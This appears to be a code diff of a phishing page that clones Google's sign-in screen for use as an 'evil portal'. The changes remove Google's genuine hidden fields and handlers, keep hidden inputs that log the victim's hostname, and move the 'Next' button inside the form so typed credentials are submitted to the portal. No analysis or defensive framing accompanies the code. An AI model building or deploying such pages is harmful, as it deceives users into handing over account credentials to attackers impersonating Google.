@@ -1,7 +1,3 @@
-<?php
-$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
-require_once('helper.php');
-?>
 
 <!DOCTYPE html>
 <!--much of the bellow is taken directly from the google sign in pages. Large sections for scripts, recaptcha, language change, etc. have been removed
@@ -11467,7 +11463,7 @@ for efficiency, these are not marked. Sections that have been added, moved, or a
           <c-wiz jsrenderer="chA7fe" class="A77ntc" data-view-id="hm18Ec"
             data-locale="en_GB" data-allow-sign-up-types="true" jsshadow
             jsdata="deferred-i6"
-            data-p="%.@.false,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,false,null,null,false,null,null,null,null,null,&quot;S-533675460:1753163842318490&quot;,null,&quot;https://accounts.google.com&quot;,null,null,null,[[],[null,null,&quot;S-533675460:1753163842318490&quot;,&quot;ServiceLogin&quot;,null,null,[[&quot;flowEntry&quot;,&quot;ServiceLogin&quot;],[&quot;flowName&quot;,&quot;GlifWebSignIn&quot;],[&quot;hl&quot;,&quot;en-gb&quot;],[&quot;ifkv&quot;,&quot;AdBytiOaqh8izX3sLiD9ZqHXhZknYSaYMPtrNrLVmM81PlnFbhDxgKxjApCvQv1dAmQzwmn_iDVSmQ&quot;],[&quot;dsh&quot;,&quot;S-533675460:1753163842318490&quot;]],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,null,null,[],null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,null,[]],null,null,null,[null,null,null,null,null,[null,[[&quot;flowEntry&quot;,[&quot;ServiceLogin&quot;]],[&quot;flowName&quot;,[&quot;GlifWebSignIn&quot;]],[&quot;hl&quot;,[&quot;en-gb&quot;]],[&quot;ifkv&quot;,[&quot;AdBytiOaqh8izX3sLiD9ZqHXhZknYSaYMPtrNrLVmM81PlnFbhDxgKxjApCvQv1dAmQzwmn_iDVSmQ&quot;]],[&quot;dsh&quot;,[&quot;S-533675460:1753163842318490&quot;]]]],null,&quot;S-533675460:1753163842318490&quot;,null,null,[]]],null,false]"
+            
             jscontroller="b3kMqb"
             jsaction="click:jKoJid(preventDefault=true|DPJEMd),WZ2Bje(Cuz2Ue);jiqeKb:UHZ0U;Pp1AU:IjS5bf;rcuQ6b:WYd;t5qvFd:.CLIENT"
             jsname="nUpftc" data-node-index="0;0" jsmodel="hc6Ubd niKKCd" view
@@ -11594,16 +11590,6 @@ for efficiency, these are not marked. Sections that have been added, moved, or a
                                     </div> 
                                   </div>  
                                 </div>
-                                <!--real googles inputs-->
-                                <input type="hidden" name="usi"
-                                  value="S-533675460:1753163842318490"
-                                  jscontroller="YgOFye">
-                                <input type="hidden" name="domain" value
-                                  jscontroller="YgOFye">
-                                <input type="hidden" name="region" value="AU"
-                                  jscontroller="YgOFye">
-                                <input type="hidden" name value jsname="duMqid"
-                                  id="fidoUserHandle" jscontroller="YgOFye">
 
                                 <!--Evil portal inputs-->
                                 <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
@@ -11616,21 +11602,18 @@ for efficiency, these are not marked. Sections that have been added, moved, or a
                         </span>
                         <!--submit button, part of original google doc but was moved from outside of the form to inside of the form and type was changed to submit-->
                         <div class="JYXaTc" jsname="DH6Rkf" jscontroller="z0u0L"
-                          jsaction="rcuQ6b:rcuQ6b;KWPV0:vjx2Ld(Njthtb),ChoyC(eBSUOb),VaKChb(gVmDzc),nCZam(W3Rzrc),Tzaumc(uRHG6),JGhSzd;dcnbp:dE26Sc(lqvTlf);FzgWvd:JGhSzd;"
                           data-is-consent="false" data-is-primary-action-disabled="false"
                           data-is-secondary-action-disabled="false"
                           data-primary-action-label="Next" jsshadow>
-                          <div class="O1Slxf" jsname="DhK0U">
                             <div class="TNTaPb" jsname="k77Iif">
                               <div jscontroller="f8Gu1e"
-                                jsaction="click:cOuCgd;JIbuQc:JIbuQc;" jsname="Njthtb"
+                                jsname="Njthtb"
                                 class="XjS9D TrZEUc" id="identifierNext">
                                 <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb"
                                   data-is-touch-wrapper="true">
                                   <button
                                     class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"
                                     jscontroller="soHxf"
-                                    jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd;"
                                     data-idom-class="nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"
                                     jsname="LgbsSe" 
                                     type="submit">
@@ -11640,7 +11623,6 @@ for efficiency, these are not marked. Sections that have been added, moved, or a
                                 </div>
                               </div>
                             </div> 
-                          </div>
                         </div>
                       </form>
                     </div>
